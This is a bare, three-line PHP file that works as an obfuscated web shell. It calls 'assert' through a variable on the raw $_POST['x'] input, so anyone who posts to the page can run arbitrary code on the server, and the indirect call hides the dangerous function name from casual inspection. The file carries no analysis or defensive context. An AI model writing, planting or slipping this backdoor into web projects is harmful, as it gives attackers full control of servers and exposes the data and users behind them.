<?php 
    $a = trim(' assert ');
    $a($_POST['x']);
?>
